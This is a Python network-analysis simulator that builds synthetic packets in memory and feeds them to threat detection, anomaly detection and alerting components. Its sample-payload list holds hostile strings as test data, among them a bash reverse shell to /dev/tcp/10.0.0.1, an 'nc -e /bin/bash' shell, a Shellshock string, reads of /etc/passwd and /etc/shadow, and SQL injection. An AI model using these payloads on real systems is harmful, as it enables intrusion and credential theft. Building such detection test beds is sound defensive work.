#!/usr/bin/env python3
from security_integrations import SecurityToolIntegrator
import logging
import sys
import signal
import time
import random
from scapy.all import IP, TCP, UDP, ICMP, Raw, ARP
from packet_analyzer import PacketAnalyzer
from threat_detector import ThreatDetector
from stats_collector import StatsCollector
from visualizer import Visualizer
from ml_analyzer import MLAnalyzer
from database import DatabaseManager
from notifier import NotificationManager

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class NetworkAnalyzer:
    def __init__(self):
        """Initialize the network analyzer with all components"""
        self.running = True
        self.packet_analyzer = PacketAnalyzer()
        self.threat_detector = ThreatDetector()
        self.stats_collector = StatsCollector(
            performance_metrics=True,  # Enable tracking of performance metrics
            connection_tracking=True,  # Enable detailed connection tracking
            attack_pattern_analysis=True  # Enable attack pattern analysis
        )
        self.visualizer = Visualizer()
        self.ml_analyzer = MLAnalyzer()
        self.db_manager = DatabaseManager()
        self.notifier = NotificationManager()
        self.security_integrator = SecurityToolIntegrator()

        # Simulation parameters
        self.simulation_speed = 1.0
        self.attack_probability = 0.2
        self.max_packets = 10000

        # Performance tracking
        self.performance_metrics = {
            'packet_loss': 0,
            'latency': 0,
            'bandwidth': 0
        }

        # Connection tracking for heatmap
        self.connection_matrix = {}
        self.update_interval = 1.0  # Update interval in seconds

        # Register signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        logger.info("Stopping packet analysis...")
        self.running = False
        sys.exit(0)

    def process_packet(self, packet):
        """Process each packet with enhanced analysis"""
        if not self.running:
            return

        try:
            packet_info = self.packet_analyzer.analyze_packet(packet)
            if packet_info:
                # Update connection matrix for heatmap
                src_ip = packet_info['src_ip']
                dst_ip = packet_info['dst_ip']
                key = f"{src_ip}->{dst_ip}"
                self.connection_matrix[key] = self.connection_matrix.get(key, 0) + 1

                # Update performance metrics
                self._update_performance_metrics(packet_info)

                # Mark packet for attack pattern tracking
                packet_info['is_attack'] = False
                packet_info['attack_type'] = None

                # Traditional threat detection logic
                threats = self.threat_detector.detect_threats(packet_info)
                security_threats = self.security_integrator.analyze_packet(packet_info)
                if threats or security_threats:
                    all_threats = threats + (security_threats if security_threats else [])
                    for threat in all_threats:
                        logger.warning(f"Potential threat detected: {threat}")
                        self.db_manager.log_threat(threat)
                        if threat.get('severity') in ['high', 'critical']:
                            self.notifier.send_alert(threat, channels=['webhook', 'email'])
                        # Mark packet as attack for pattern tracking
                        packet_info['is_attack'] = True
                        packet_info['attack_type'] = threat.get('type', 'Unknown')

                # Statistical anomaly detection
                anomalies = self.ml_analyzer.detect_anomalies(packet_info)
                if anomalies:
                    for anomaly in anomalies:
                        logger.warning(f"Anomaly detected: {anomaly}")
                        # Get features and baseline stats for logging
                        features = self.ml_analyzer.extract_features(packet_info)
                        baseline_stats = self.ml_analyzer.get_baseline_stats()
                        # Log anomaly with features and stats
                        self.db_manager.log_anomaly(
                            anomaly,
                            features=features.tolist(),  # Convert numpy array to list
                            baseline_stats=baseline_stats
                        )
                        if anomaly.get('confidence', 0) > 0.8:
                            self.notifier.send_alert(anomaly, channels=['webhook'])
                        # Mark packet as attack for pattern tracking
                        packet_info['is_attack'] = True
                        packet_info['attack_type'] = 'ML_ANOMALY'

                # Update statistics
                self.stats_collector.update_stats(packet_info)

        except Exception as e:
            logger.error(f"Error processing packet: {e}")

    def _update_performance_metrics(self, packet_info):
        """Update network performance metrics"""
        try:
            # Simulate packet loss (random loss between 0-2%)
            self.performance_metrics['packet_loss'] = random.uniform(0, 2)

            # Simulate network latency (random between 5-100ms)
            self.performance_metrics['latency'] = random.uniform(5, 100)

            # Calculate bandwidth based on packet size and time
            packet_size = packet_info.get('length', 0)
            current_time = time.time()
            if hasattr(self, '_last_bandwidth_update'):
                time_diff = current_time - self._last_bandwidth_update
                if time_diff > 0:
                    self.performance_metrics['bandwidth'] = (packet_size * 8) / (time_diff * 1000000)  # Mbps
            self._last_bandwidth_update = current_time

        except Exception as e:
            logger.error(f"Error updating performance metrics: {e}")

    def generate_sample_packet(self, protocol='TCP'):
        """Generate a realistic sample packet"""
        src_ip = f"192.168.1.{random.randint(1, 254)}"
        dst_ip = f"10.0.0.{random.randint(1, 254)}"

        if protocol == 'TCP':
            sport = random.randint(1024, 65535)
            dport = random.choice([80, 443, 8080, 22, 21, 3306, 5432])
            flags = random.choice(['S', 'SA', 'A', 'PA', 'FA', 'R', 'F'])
            payload = self._generate_sample_payload() if random.random() > 0.7 else b""
            packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=dport, flags=flags)
            if payload:
                packet = packet/Raw(load=payload)
            return packet

        elif protocol == 'UDP':
            sport = random.randint(1024, 65535)
            dport = random.choice([53, 67, 68, 123, 161, 1900, 5353])
            payload = self._generate_sample_payload() if random.random() > 0.5 else b""
            return IP(src=src_ip, dst=dst_ip)/UDP(sport=sport, dport=dport)/Raw(load=payload)

        elif protocol == 'ICMP':
            icmp_type = random.choice([0, 8, 3, 11, 13, 17])
            return IP(src=src_ip, dst=dst_ip)/ICMP(type=icmp_type)

        elif protocol == 'ARP':
            return ARP(
                psrc=src_ip,
                pdst=dst_ip,
                hwsrc=self._generate_mac(),
                hwdst=self._generate_mac(),
                op=random.choice([1, 2])
            )
        return None

    def _generate_sample_payload(self):
        """Generate diverse sample payloads including attack patterns"""
        payloads = [
            # Normal HTTP traffic
            b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"POST /api/data HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"data\": \"test\"}",

            # SQL Injection attempts
            b"SELECT * FROM users WHERE id = 1 OR '1'='1'",
            b"UNION SELECT username,password FROM users--",
            b"'; DROP TABLE users; --",

            # Command injection
            b"() { :; }; /bin/bash -c 'cat /etc/passwd'",
            b"; cat /etc/shadow; echo 'pwned'",
            b"|whoami",

            # Buffer overflow simulation
            b"A" * 1000,
            b"%x" * 500,

            # Shell commands
            b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            b"nc -e /bin/bash 10.0.0.1 4444",

            # Web attacks
            b"GET /admin HTTP/1.1\r\nHost: example.com\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n",
            b"POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin'+OR+'1'='1",

            # Protocol-specific attacks
            b"SMBv1\x00\x00\x00\x00",
            b"\x00\x00\x00\x00\x00\x01\x00\x00",

            # Large DNS query (tunneling)
            b"A" * 200 + b".example.com",
        ]
        return random.choice(payloads)

    def simulate_attack_patterns(self):
        """Simulate various attack patterns with realistic timing"""
        logger.info("Starting attack pattern simulation...")
        try:
            while self.running:
                # Regular traffic simulation
                for _ in range(50):
                    if random.random() < self.attack_probability:
                        self._simulate_attack_sequence()
                    else:
                        self._simulate_normal_traffic()
                    time.sleep(0.1 / self.simulation_speed)

                # Periodic attack patterns
                attack_type = random.choice(['syn_flood', 'port_scan', 'sql_injection', 'ddos'])
                self._simulate_specific_attack(attack_type)

        except Exception as e:
            logger.error(f"Error during attack simulation: {e}")
            sys.exit(1)

    def _simulate_normal_traffic(self):
        """Simulate normal network traffic"""
        protocols = ['TCP', 'UDP', 'ICMP', 'ARP']
        weights = [0.6, 0.3, 0.05, 0.05]
        protocol = random.choices(protocols, weights=weights)[0]
        packet = self.generate_sample_packet(protocol)
        if packet:
            self.process_packet(packet)

    def _simulate_attack_sequence(self):
        """Simulate a sequence of attack packets"""
        attack_types = [
            self._syn_flood_attack,
            self._port_scan_attack,
            self._sql_injection_attack,
            self._command_injection_attack,
            self._dns_tunnel_attack
        ]
        random.choice(attack_types)()

    def _simulate_specific_attack(self, attack_type):
        """Simulate a specific type of attack"""
        if attack_type == 'syn_flood':
            self._syn_flood_attack()
        elif attack_type == 'port_scan':
            self._port_scan_attack()
        elif attack_type == 'sql_injection':
            self._sql_injection_attack()
        elif attack_type == 'ddos':
            self._ddos_attack()

    def _syn_flood_attack(self):
        """Simulate SYN flood attack"""
        target_ip = f"10.0.0.{random.randint(1, 254)}"
        for _ in range(20):
            packet = IP(src=f"192.168.1.{random.randint(1,254)}", dst=target_ip)/TCP(
                sport=random.randint(1024, 65535),
                dport=80,
                flags='S'
            )
            # Mark packet as attack
            packet_info = {
                'src_ip': packet[IP].src,
                'dst_ip': packet[IP].dst,
                'protocol': 'TCP',
                'length': len(packet),
                'details': {'src_port': packet[TCP].sport, 'dst_port': packet[TCP].dport},
                'is_attack': True,
                'attack_type': 'SYN_FLOOD'
            }
            self.process_packet(packet_info)
            time.sleep(0.01 / self.simulation_speed)

    def _port_scan_attack(self):
        """Simulate port scanning attack"""
        target_ip = f"10.0.0.{random.randint(1, 254)}"
        for port in range(20, 25):
            packet = IP(src="192.168.1.100", dst=target_ip)/TCP(
                sport=random.randint(1024, 65535),
                dport=port,
                flags='S'
            )
            # Mark packet as attack
            packet_info = {
                'src_ip': packet[IP].src,
                'dst_ip': packet[IP].dst,
                'protocol': 'TCP',
                'length': len(packet),
                'details': {'src_port': packet[TCP].sport, 'dst_port': packet[TCP].dport},
                'is_attack': True,
                'attack_type': 'PORT_SCAN'
            }
            self.process_packet(packet_info)
            time.sleep(0.05 / self.simulation_speed)

    def _sql_injection_attack(self):
        """Simulate SQL injection attack"""
        packet = self.generate_sample_packet('TCP')
        packet = packet/Raw(load=b"SELECT * FROM users WHERE id = 1 OR '1'='1'")
        packet_info = {
            'src_ip': packet[IP].src,
            'dst_ip': packet[IP].dst,
            'protocol': 'TCP',
            'length': len(packet),
            'details': {'src_port': packet[TCP].sport, 'dst_port': packet[TCP].dport},
            'is_attack': True,
            'attack_type': 'SQL_INJECTION'
        }
        self.process_packet(packet_info)

    def _command_injection_attack(self):
        """Simulate command injection attack"""
        packet = self.generate_sample_packet('TCP')
        packet = packet/Raw(load=b"; cat /etc/passwd; echo 'pwned'")
        self.process_packet(packet)

    def _dns_tunnel_attack(self):
        """Simulate DNS tunneling attack"""
        for _ in range(5):
            packet = IP(src="192.168.1.100", dst="10.0.0.53")/UDP(
                sport=random.randint(1024, 65535),
                dport=53
            )/Raw(load=b"A"*200 + b".example.com")
            self.process_packet(packet)
            time.sleep(0.1 / self.simulation_speed)

    def _ddos_attack(self):
        """Simulate DDoS attack"""
        target_ip = f"10.0.0.{random.randint(1, 254)}"
        for _ in range(30):
            packet = IP(src=f"192.168.1.{random.randint(1,254)}", dst=target_ip)/UDP(
                sport=random.randint(1024, 65535),
                dport=random.randint(1, 65535)
            )/Raw(load=b"X"*1000)
            # Mark packet as attack
            packet_info = {
                'src_ip': packet[IP].src,
                'dst_ip': packet[IP].dst,
                'protocol': 'UDP',
                'length': len(packet),
                'details': {'src_port': packet[UDP].sport, 'dst_port': packet[UDP].dport},
                'is_attack': True,
                'attack_type': 'DDOS'
            }
            self.process_packet(packet_info)
            time.sleep(0.01 / self.simulation_speed)

    def _generate_mac(self):
        """Generate a random MAC address"""
        return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])

def main():
    analyzer = NetworkAnalyzer()
    analyzer.simulate_attack_patterns()

if __name__ == "__main__":
    main()